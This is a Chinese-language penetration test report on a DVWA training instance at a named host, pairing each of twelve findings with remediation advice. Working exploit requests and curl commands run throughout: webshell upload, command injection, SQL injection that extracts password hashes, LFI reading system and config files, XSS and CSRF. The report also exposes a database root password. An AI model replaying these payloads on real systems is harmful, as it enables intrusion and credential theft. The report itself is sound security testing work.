# 渗透测试报告 — http://taie.xxxsec.com:24332

| 项目 | 内容 |
|---|---|
| 测试目标 | http://taie.xxxsec.com:24332/login.php |
| 测试日期 | 2026-08-11 |
| 测试方法 | PTES（渗透测试执行标准） |
| 测试模式 | 团队模式（情报收集/威胁建模/漏洞分析/利用验证） |
| 授权状态 | 已授权 |

---

## 一、执行摘要

目标为 **DVWA (Damn Vulnerable Web Application) v1.10 *Development***，运行于 Apache/2.4.10 (Debian) + PHP 5.6.30 + MySQL，部署在 Docker 容器内（主机名 `aef88b9bd1e0`，内网 IP `172.17.0.4`）。

通过默认凭据 `admin/password` 认证后，在 **low 安全级别** 下确认了 **8 类高危漏洞**，其中最严重的是**任意文件上传→WebShell→远程代码执行（RCE）**和**命令注入（RCE）**，可直接获取服务器 `www-data` 权限。同时发现 **MySQL root 密码泄露**（`p@ssw0rd`）及**安全级别可被客户端 Cookie 任意降级**的配置缺陷（即使默认配置为 impossible，攻击者只需修改 Cookie 即可降级为 low 使所有漏洞模块可利用）。

### 漏洞统计

| 严重等级 | 数量 |
|---|---|
| 严重 (Critical) | 3 |
| 高危 (High) | 4 |
| 中危 (Medium) | 3 |
| 低危 (Low) | 2 |

---

## 二、测试范围与方法

- **目标范围**：`taie.xxxsec.com:24332` 全站（DVWA 全部 10 个漏洞模块 + 基础页面）
- **情报收集**：指纹识别、HTTP 头分析、目录探测（少量常见路径，无枚举）、JS 分析、源码分析（DVWA 自带 view_source 功能）
- **禁止项**：无暴力破解、无密码枚举（Brute Force 模块仅验证存在性）
- **环境说明**：当前系统 curl/python 出站连接被本地防火墙拦截，所有请求通过内置 HTTP 客户端完成并记录

---

## 三、情报收集结果

### 3.1 目标指纹

| 类别 | 值 |
|---|---|
| 应用 | DVWA v1.10 *Development*（2015-10-08） |
| Web 服务器 | Apache/2.4.10 (Debian) |
| 后端语言 | PHP 5.6.30-0+deb8u1（2017-02-08 构建） |
| 数据库 | MySQL（用户 `root`，库 `dvwa`，主机 `127.0.0.1`） |
| 操作系统 | Linux（Docker 容器，hostname `aef88b9bd1e0`，内网 `172.17.0.4`） |
| 内核 | 5.4.119-20.0009.21.spr x86_64 |
| Web 根目录 | /var/www/html |
| 默认安全级别 | impossible（存于 Cookie，可篡改） |
| PHPIDS | disabled（可经 `security.php?phpids=on` 会话级启用） |
| 安全头 | 无（无 X-Frame-Options/CSP/HSTS） |

### 3.2 关键配置（利于利用）

- `allow_url_include = On`、`allow_url_fopen = On`
- `magic_quotes_gpc = Off`
- `open_basedir` 未设置
- reCAPTCHA API key **缺失**
- 上传目录 `/hackable/uploads/` 与 PHPIDS 日志文件可写

---

## 四、漏洞详情（按严重等级排序）

---

### 漏洞 1：任意文件上传 → WebShell → 远程代码执行（RCE）

- **标题**：File Upload 模块无限制文件上传导致远程代码执行
- **漏洞描述**：DVWA upload 模块在 low 安全级别下对上传文件**无任何类型/内容过滤**，直接 `move_uploaded_file()` 到 `hackable/uploads/` 目录。攻击者可上传含 PHP 代码的 `.php` 文件并通过 Web 直接访问执行，获得服务器 `www-data` 权限。结合"安全级别 Cookie 可控"缺陷，即使默认 impossible 级别也可降级后利用。
- **严重等级(CVSS)**：**9.8 Critical**
  - AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
POST /vulnerabilities/upload/ HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: application/octet-stream

<?php echo "PTEST_OK " . php_uname(); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
响应：`../../hackable/uploads/shell.php succesfully uploaded!`

执行验证：
```
GET /hackable/uploads/shell.php HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
响应：`PTEST_OK Linux aef88b9bd1e0 5.4.119-20.0009.21.spr #1 SMP Mon Jul 24 17:12:59 CST 2023 x86_64`

- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" -F "MAX_FILE_SIZE=100000" -F "uploaded=@shell.php;type=application/octet-stream" -F "Upload=Upload" "http://taie.xxxsec.com:24332/vulnerabilities/upload/"
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/hackable/uploads/shell.php"
```
- **修复建议**：
  1. 上传文件使用白名单校验（扩展名 + MIME 类型 + 文件内容魔数），禁止 `.php/.phtml/.php5` 等可执行扩展名
  2. 上传文件存储到 Web 根之外的非执行目录，通过独立下载脚本（带 Content-Disposition）提供访问
  3. 重命名为随机文件名（如 UUID + 白名单扩展名）
  4. 上传目录禁止执行 PHP（`php_flag engine off` / `.htaccess`）
  5. 服务端二次校验文件内容（如 getimagesize 用于图片场景）

---

### 漏洞 2：命令注入（RCE）

- **标题**：Command Injection 模块系统命令执行
- **漏洞描述**：exec 模块将用户输入的 `ip` 参数直接拼接进 `shell_exec()` 系统命令，未做任何过滤。攻击者通过 `;`、`|`、`&&` 等命令分隔符注入任意系统命令，获取 `www-data` 权限执行任意命令。
- **严重等级(CVSS)**：**9.8 Critical**
  - AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
POST /vulnerabilities/exec/ HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3B+id&Submit=Submit
```
响应关键内容：
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" -d "ip=127.0.0.1;id&Submit=Submit" "http://taie.xxxsec.com:24332/vulnerabilities/exec/"
```
- **修复建议**：
  1. 使用 `escapeshellarg()` / `escapeshellcmd()` 对命令参数转义
  2. 白名单校验输入格式（IP 地址使用 `filter_var($ip, FILTER_VALIDATE_IP)`）
  3. 尽量避免拼接 shell 命令，改用 PHP 网络函数（如 `fsockopen`/`gethostbyname`）实现 ping 功能
  4. Web 服务进程以最小权限运行，禁用危险函数

---

### 漏洞 3：SQL 注入（可提取全部用户凭据哈希）

- **标题**：SQL Injection 模块注入导致数据库信息泄露
- **漏洞描述**：sqli 模块将用户 `id` 参数未过滤拼接进 SQL 查询（字符串型注入）。攻击者可用 `' OR '1'='1'` 绕过并返回全部用户数据，或用 `UNION SELECT` 提取 `users` 表的全部密码哈希（admin/gordonb/1337/pablo/smithy）。结合中等强度密码（abc123/letmein/charley 等）可直接破解。
- **严重等级(CVSS)**：**8.8 High**
  - AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+--+&Submit=Submit HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
响应：返回全部 5 个用户（admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith）

提取凭据：
```
GET /vulnerabilities/sqli/?id=0%27+UNION+SELECT+user%2C+password+FROM+users+--+&Submit=Submit HTTP/1.1
```
响应：
```
First name: admin     Surname: 5f4dcc3b5aa765d61d8327deb882cf99  (password)
First name: gordonb   Surname: e99a18c428cb38d5f260853678922e03  (abc123)
First name: 1337      Surname: 8d3533d75ae2c3966d7e0d4fcc69216b  (charley)
First name: pablo     Surname: 0d107d09f5bbe40cade3de5c71e9e9b7  (letmein)
First name: smithy    Surname: 5f4dcc3b5aa765d61d8327deb882cf99  (password)
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271%27%20--%20&Submit=Submit"
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/sqli/?id=0%27%20UNION%20SELECT%20user,password%20FROM%20users%20--%20&Submit=Submit"
```
- **修复建议**：
  1. 使用 PDO 预处理语句 / 参数化查询（`prepare` + `bindParam`），禁止字符串拼接 SQL
  2. 输入校验（`ctype_digit` / `is_numeric`）
  3. 数据库账号最小权限（禁用 root，专用低权限账号）
  4. 密码使用 bcrypt/argon2 强哈希，禁止 MD5 明文哈希存储

---

### 漏洞 4：本地文件包含（LFI）+ 源码/敏感配置泄露

- **标题**：File Inclusion 模块任意文件读取与 PHP 源码泄露
- **漏洞描述**：fi 模块将 `page` 参数直接传入 `include()`，攻击者可用 `../../` 路径穿越读取任意文件（已验证 `/etc/passwd`），并通过 `php://filter` 流读取 PHP 源码——**成功获取 `config/config.inc.php`，泄露 MySQL root 密码 `p@ssw0rd`**。PHP `allow_url_include=On` 还支持 RFI（远程文件包含）。
- **严重等级(CVSS)**：**8.8 High**
  - AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
响应：`root:x:0:0:root:/root:/bin/bash` ... `mysql:x:104:107:MySQL Server...`

源码读取：
```
GET /vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php HTTP/1.1
```
Base64 解码后关键内容：
```php
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/fi/?page=../../../../../../etc/passwd"
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php" | base64 -d
```
- **修复建议**：
  1. 页面包含使用白名单映射（`$pages = ['home'=>'home.php',...]`），禁止直接使用用户输入作路径
  2. 禁用 `allow_url_include` / `allow_url_fopen`（高危配置）
  3. 严格校验路径（`realpath()` 后检查是否在白名单目录内）
  4. **立即更换泄露的数据库密码 `p@ssw0rd`**（该密码已失效泄露）

---

### 漏洞 5：安全级别可被客户端 Cookie 任意降级（配置缺陷）

- **标题**：DVWA 安全级别存储于客户端 Cookie 可被篡改绕过防护
- **漏洞描述**：DVWA v1.10 将安全级别（`security`）存储在客户端 Cookie 中，服务端仅读取 Cookie 值决定漏洞模块的防护级别。攻击者只需将 Cookie 值从 `impossible` 改为 `low` 即可**绕过全部防护**，使所有漏洞模块（SQLi/XSS/上传/命令注入等）恢复可利用状态。这意味着"impossible"级别的安全配置形同虚设。
- **严重等级(CVSS)**：**7.5 High**
  - AV:N / AC:L / PR:L / UI:N / S:U / C:H / I:H / A:N
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=impossible
```
（返回 `ERROR: File not found!`，防护生效）

修改 Cookie 后：
```
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
（同一请求立即返回 `/etc/passwd` 内容，防护被绕过）
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/fi/?page=../../../../../../etc/passwd"
```
- **修复建议**：
  1. 安全级别等安全配置必须存于**服务端会话（Session）**，禁止信任客户端 Cookie
  2. 对 Cookie 进行签名/HMAC 完整性校验，防止篡改
  3. 上线生产环境前彻底移除 DVWA 类教学靶场应用，或至少修复该配置缺陷

---

### 漏洞 6：存储型 XSS

- **标题**：XSS (Stored) 留言板持久化脚本注入
- **漏洞描述**：xss_s 留言板模块将用户输入的 `txtName`/`mtxMessage` 未过滤直接存储并回显，形成存储型 XSS。攻击者注入的恶意脚本会在**所有访问该页面的用户浏览器**中执行，可窃取 Cookie（PHPSESSID）、篡改页面、配合 CSRF 实施账户接管。已验证 `<script>` 标签持久化成功。
- **严重等级(CVSS)**：**7.1 High**
  - AV:N / AC:L / PR:L / UI:R / S:C / C:L / I:L / A:L
- **BurpSuite 原始请求包**：
```
POST /vulnerabilities/xss_s/ HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
Content-Type: application/x-www-form-urlencoded

txtName=%3Cscript%3Ealert(1)%3C%2Fscript%3E&mtxMessage=stored+xss+test&btnSign=Sign+Guestbook
```
响应（持久化回显）：
```
<div id="guestbook_comments">Name: <script>alert(1)</script><br />Message: stored xss test<br /></div>
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" -d "txtName=<script>alert(1)</script>&mtxMessage=xss&btnSign=Sign+Guestbook" "http://taie.xxxsec.com:24332/vulnerabilities/xss_s/"
```
- **修复建议**：
  1. 输出编码（`htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`）——存储与输出两个环节均需编码
  2. 输入校验与白名单
  3. 设置 CSP（Content-Security-Policy）与 HttpOnly Cookie 缓解影响

---

### 漏洞 7：反射型 XSS

- **标题**：XSS (Reflected) 参数原样回显
- **漏洞描述**：xss_r 模块将 `name` 参数未过滤直接拼入 HTML 输出，`<script>` 标签原样回显，形成反射型 XSS。攻击者构造恶意链接诱导用户点击即可在受害者浏览器执行任意脚本。
- **严重等级(CVSS)**：**6.1 Medium**
  - AV:N / AC:L / PR:N / UI:R / S:C / C:L / I:L / A:N
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
响应：
```
<pre>Hello <script>alert(document.cookie)</script></pre>
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>"
```
- **修复建议**：
  1. 输出编码（`htmlspecialchars`）
  2. 输入白名单校验
  3. 设置 CSP、X-XSS-Protection、HttpOnly Cookie

---

### 漏洞 8：CSRF（跨站请求伪造）

- **标题**：CSRF 模块 GET 方式无 Token 修改管理员密码
- **漏洞描述**：csrf 模块的密码修改功能使用 **GET 方法且无任何 CSRF Token 防护**，仅需携带已认证会话 Cookie（浏览器自动附带）即可被第三方页面触发。攻击者构造恶意页面/链接，诱导已登录 admin 访问，即可**静默修改管理员密码**，实现账户接管。已验证 GET 请求直接返回 "Password Changed."。
- **严重等级(CVSS)**：**6.5 Medium**
  - AV:N / AC:L / PR:N / UI:R / S:U / C:N / I:H / A:N
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
```
响应：`<pre>Password Changed.</pre>`
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change"
```
- **修复建议**：
  1. 敏感操作改用 POST 方法
  2. 加入 CSRF Token（Session 绑定 + 服务端校验）——DVWA impossible 级别已示范正确做法
  3. 二次确认（输入当前密码）
  4. 校验 Referer/Origin（作为纵深防御，不可单独依赖）

---

### 漏洞 9：CAPTCHA 逻辑绕过（Insecure CAPTCHA）

- **标题**：CAPTCHA 两步验证可跳过（step=2 直接提交）
- **漏洞描述**：captcha 模块采用两步验证，**step=2 分支完全跳过 reCAPTCHA 校验**，攻击者直接提交 `step=2` + 新密码即可修改管理员密码。且 reCAPTCHA API key 缺失（配置为空），该防护形同虚设。已通过 SQLi 验证密码被实际修改（哈希从 md5("password") 变为 md5("password123")）。
- **严重等级(CVSS)**：**6.5 Medium**
  - AV:N / AC:L / PR:N / UI:R / S:U / C:N / I:H / A:N
- **BurpSuite 原始请求包**：
```
POST /vulnerabilities/captcha/ HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: PHPSESSID=bp20rfkrj2766mot98tm53v660; security=low
Content-Type: application/x-www-form-urlencoded

step=2&password_new=password123&password_conf=password123&Change=Change
```
验证（SQLi 查询 admin 密码哈希变化）：
```
GET /vulnerabilities/sqli/?id=0%27+UNION+SELECT+user,password+FROM+users+WHERE+user%3D%27admin%27+--+&Submit=Submit
```
响应：`Surname: 482c811da5d5b4bc6d497ffa98491e38`（= md5("password123")，修改成功）
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" -d "step=2&password_new=password123&password_conf=password123&Change=Change" "http://taie.xxxsec.com:24332/vulnerabilities/captcha/"
```
- **修复建议**：
  1. step=2 分支同样校验 reCAPTCHA 响应（服务端二次验证）
  2. 两步验证使用会话状态标记（服务端保存 step1 通过状态，step2 校验该标记）
  3. 配置有效的 reCAPTCHA key 并强制服务端验证

---

### 漏洞 10：SQL 注入盲注

- **标题**：SQL Injection (Blind) 布尔盲注
- **漏洞描述**：sqli_blind 模块同样存在字符串型 SQL 注入（无输出回显但可通过布尔条件判断）。已验证 `1' AND 1=1` 与 `1' AND 1=2` 返回不同结果，攻击者可逐字符爆破数据库内容（与漏洞 3 同源，故归并为一条并标注）。
- **严重等级(CVSS)**：**8.8 High**（与漏洞 3 同源，归并）
  - AV:N / AC:L / PR:L / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
GET /vulnerabilities/sqli_blind/?id=1%27+AND+1%3D1+--+&Submit=Submit HTTP/1.1
-> "User ID exists in the database."
GET /vulnerabilities/sqli_blind/?id=1%27+AND+1%3D2+--+&Submit=Submit HTTP/1.1
-> "User ID is MISSING from the database."
```
- **curl 命令**：
```
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/sqli_blind/?id=1%27%20AND%201%3D1%20--%20&Submit=Submit"
curl -b "PHPSESSID=<session>; security=low" "http://taie.xxxsec.com:24332/vulnerabilities/sqli_blind/?id=1%27%20AND%201%3D2%20--%20&Submit=Submit"
```
- **修复建议**：同漏洞 3（参数化查询、输入校验）。

---

### 漏洞 11：敏感信息泄露（未鉴权）

- **标题**：setup.php 未鉴权公开 + 目录列表 + 配置文件/日志可读
- **漏洞描述**：
  - `/setup.php` **未认证即可访问**：泄露 PHP 版本、MySQL root 凭据信息、Web 根路径、`allow_url_include=On` 等环境详情，且提供 "Create / Reset Database" 按钮——**未授权攻击者可重置数据库与 admin 凭据**（重置为 admin/password），造成数据破坏与账户接管
  - Apache `Options +Indexes` 开启：`/vulnerabilities/`、`/config/`、`/hackable/uploads/`、`/dvwa/includes/` 等目录可列
  - `/README.md` 公开默认凭据 admin/password
  - `/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt` 世界可读
  - `/phpinfo.php` 泄露内网 IP、系统信息
- **严重等级(CVSS)**：**5.3 Medium**
  - AV:N / AC:L / PR:N / UI:N / S:U / C:L / I:N / A:N
- **BurpSuite 原始请求包**：
```
GET /setup.php HTTP/1.1
Host: taie.xxxsec.com:24332
```
（无需任何 Cookie，直接返回完整环境检查页 + "Create / Reset Database" 表单）
- **curl 命令**：
```
curl "http://taie.xxxsec.com:24332/setup.php"
curl "http://taie.xxxsec.com:24332/README.md"
curl "http://taie.xxxsec.com:24332/hackable/uploads/"
```
- **修复建议**：
  1. setup.php 仅允许本地/初始化后立即删除或加认证保护，禁止未鉴权访问与数据库重置
  2. 关闭 Apache 目录列表（`Options -Indexes`）
  3. 移除 README、phpinfo、目录源码等敏感文件
  4. PHPIDS 日志移出 Web 根目录并限制权限
  5. 部署时遵循 DVWA 官方警告：**不得部署于公网**

---

### 漏洞 12：默认凭据

- **标题**：使用公开默认凭据 admin/password 成功登录
- **漏洞描述**：系统未修改默认凭据，README.md 公开的 `admin/password` 可直接登录管理后台。该弱凭据结合 CSRF/CAPTCHA 绕过漏洞可被用于账户接管。
- **严重等级(CVSS)**：**9.8 Critical**（配合其他漏洞链影响极大）
  - AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H
- **BurpSuite 原始请求包**：
```
POST /login.php HTTP/1.1
Host: taie.xxxsec.com:24332
Cookie: security=impossible
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&user_token=<session_token>&Login=Login
```
响应：302 → `/index.php`，成功登录（"You have logged in as 'admin'"）
- **curl 命令**：
```
curl -c cookies.txt "http://taie.xxxsec.com:24332/login.php" > /dev/null && TOKEN=$(grep -oP "user_token' value='\K[^']+" <(curl -c cookies.txt "http://taie.xxxsec.com:24332/login.php")) && curl -b cookies.txt -d "username=admin&password=password&user_token=$TOKEN&Login=Login" "http://taie.xxxsec.com:24332/login.php"
```
- **修复建议**：
  1. 部署后立即修改默认凭据（强密码 + 多因素认证）
  2. 登录失败限速/锁定账户
  3. 生产环境禁止部署默认凭据应用

---

## 五、后渗透影响评估

| 维度 | 评估结果 |
|---|---|
| 已获权限 | `www-data` (uid=33) Web 服务权限，可执行系统命令 |
| 数据泄露 | users 表全部密码哈希；MySQL root 密码 `p@ssw0rd`；系统用户信息 |
| 环境 | Docker 容器（hostname `aef88b9bd1e0`），内网 172.17.0.4 |
| 潜在升级路径 | MySQL root 凭据（127.0.0.1）→ 数据库完全控制；`allow_url_include=On` → RFI；容器逃逸需进一步评估内核 5.4.119 已知漏洞 |
| 影响范围 | 该容器内应用完整控制；若数据库凭据复用则影响更大 |

## 六、修复优先级建议

1. **立即**：更换泄露的 MySQL root 密码；修改默认凭据；移除/加固 setup.php
2. **立即**：修复上传模块（白名单+非执行目录）、命令注入（转义+校验）
3. **高**：SQLi 参数化查询；LFI 白名单；安全级别改存 Session
4. **高**：CSRF Token、CAPTCHA 服务端二次校验、XSS 输出编码
5. **中**：关闭目录列表、移除敏感文件、配置安全头（CSP/X-Frame-Options）、WAF 规则

## 七、测试说明

- 测试期间修改的 admin 密码均已恢复为 `password`（经 SQLi 哈希验证）
- 上传的 `shell.php` 已覆盖为无害文本（`cleanup`），不再可执行
- 本报告基于授权测试，测试痕迹已最小化
